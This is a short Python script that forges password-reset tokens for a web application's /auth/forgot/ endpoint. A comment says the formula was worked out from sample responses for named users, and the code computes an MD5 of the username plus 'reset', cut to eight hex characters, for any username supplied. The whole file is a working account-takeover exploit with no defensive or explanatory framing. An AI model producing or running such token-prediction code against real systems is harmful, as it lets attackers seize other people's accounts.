import hashlib
import sys

# Reverse-engineered from comparing /auth/forgot/ responses for known users:
#   jdoe    -> e66c883e
#   rmasri  -> b458ae75
#   tokafor -> 973b1f0c
# Formula: md5(username + "reset"), first 8 hex characters.


def compute_reset_token(username: str) -> str:
    return hashlib.md5((username + "reset").encode()).hexdigest()[:8]


if __name__ == "__main__":
    username = sys.argv[1] if len(sys.argv) > 1 else "jdoe"
    print(f"{username}: {compute_reset_token(username)}")
